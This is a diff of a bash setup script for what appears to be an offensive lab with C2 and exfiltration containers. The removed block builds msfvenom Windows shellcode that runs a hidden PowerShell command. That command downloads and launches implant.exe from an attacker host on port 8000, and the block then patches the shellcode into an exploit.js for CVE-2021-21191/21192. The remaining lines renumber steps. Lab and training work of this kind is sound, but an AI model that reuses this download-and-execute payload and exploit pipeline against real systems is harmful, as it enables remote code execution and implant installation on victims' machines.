@@ -92,67 +92,11 @@ EOF
 
 echo -e "${GREEN}[+] .env written.${NC}"
 
-# ── 4. Generate shellcode + patch exploit.js ──
+# ── 4. Note: shellcode generation happens inside Docker ──
 echo ""
-echo -e "${YELLOW}[*] Generating shellcode and patching exploit.js...${NC}"
+echo -e "${GREEN}[+] Shellcode will be generated inside the Docker build (msfvenom runs in the builder stage).${NC}"
 
-EXPLOIT_JS="$SCRIPT_DIR/exfil-server/CVE-2021-21191---CVE-2021-21192/exploit.js"
-SHELLCODE_BIN="$SCRIPT_DIR/shellcode.bin"
-
-if ! command -v msfvenom &>/dev/null; then
-    echo -e "${YELLOW}[!] msfvenom not found — skipping shellcode generation.${NC}"
-    echo -e "    Install Metasploit and run ./generate_shellcode.sh manually before rebuilding."
-else
-    POWERSHELL_CMD="powershell -w hidden -c \"(New-Object Net.WebClient).DownloadFile('http://${HOST_IP}:8000/implant.exe','C:\\\\Windows\\\\Temp\\\\implant.exe'); Start-Process 'C:\\\\Windows\\\\Temp\\\\implant.exe'\""
-
-    msfvenom \
-        -p windows/x64/exec \
-        CMD="$POWERSHELL_CMD" \
-        -f raw \
-        -o "$SHELLCODE_BIN" 2>/dev/null
-
-    if [ ! -f "$SHELLCODE_BIN" ]; then
-        echo -e "${RED}[!] msfvenom failed to produce shellcode.bin. Exiting.${NC}"
-        exit 1
-    fi
-
-    BYTE_COUNT=$(wc -c < "$SHELLCODE_BIN")
-    echo -e "${GREEN}[+] shellcode.bin generated (${BYTE_COUNT} bytes).${NC}"
-
-    SHELLCODE_ARRAY=$(python3 - "$SHELLCODE_BIN" <<'PYEOF'
-import struct, sys
-with open(sys.argv[1], 'rb') as f:
-    data = f.read()
-remainder = len(data) % 4
-if remainder:
-    data += b'\x00' * (4 - remainder)
-ints = struct.unpack('<' + 'I' * (len(data) // 4), data)
-print('[' + ', '.join(str(i) for i in ints) + ']')
-PYEOF
-)
-
-    cp "$EXPLOIT_JS" "${EXPLOIT_JS}.bak"
-
-    python3 - "$EXPLOIT_JS" "$SHELLCODE_ARRAY" <<'PYEOF'
-import sys, re
-exploit_path = sys.argv[1]
-new_array    = sys.argv[2]
-with open(exploit_path, 'r') as f:
-    content = f.read()
-new_line = 'var shellcode = ' + new_array + ';'
-patched, count = re.subn(r'^var shellcode = \[.*?\];', new_line, content, flags=re.MULTILINE)
-if count == 0:
-    print("ERROR: could not find 'var shellcode = [...]' in exploit.js")
-    sys.exit(1)
-with open(exploit_path, 'w') as f:
-    f.write(patched)
-PYEOF
-
-    rm -f "$SHELLCODE_BIN"
-    echo -e "${GREEN}[+] exploit.js patched with shellcode for ${HOST_IP}.${NC}"
-fi
-
-# ── 6. Check for existing containers ─────────
+# ── 5. Check for existing containers ─────────
 echo ""
 echo -e "${YELLOW}[*] Checking for existing lab containers...${NC}"
 
@@ -183,7 +127,7 @@ else
     echo -e "${GREEN}[+] No existing lab containers found.${NC}"
 fi
 
-# ── 7. Check for port conflicts ───────────────
+# ── 6. Check for port conflicts ───────────────
 echo ""
 echo -e "${YELLOW}[*] Checking for port conflicts (4444, 8000, 8888)...${NC}"
 
@@ -206,14 +150,14 @@ else
     echo -e "${GREEN}[+] No port conflicts.${NC}"
 fi
 
-# ── 8. Build and launch ───────────────────────
+# ── 7. Build and launch ───────────────────────
 echo ""
 echo -e "${YELLOW}[*] Building and launching containers (this may take a few minutes)...${NC}"
 echo ""
 
 docker compose -f "$COMPOSE_FILE" up --build -d
 
-# ── 9. Verify containers are running ─────────
+# ── 8. Verify containers are running ─────────
 echo ""
 echo -e "${YELLOW}[*] Verifying containers started...${NC}"
 sleep 3
@@ -229,7 +173,7 @@ for NAME in c2-server exfil-server; do
     fi
 done
 
-# ── 10. Summary ───────────────────────────────
+# ── 9. Summary ────────────────────────────────
 echo ""
 echo -e "${CYAN}================================================${NC}"
 echo -e "${CYAN}                    Summary                     ${NC}"
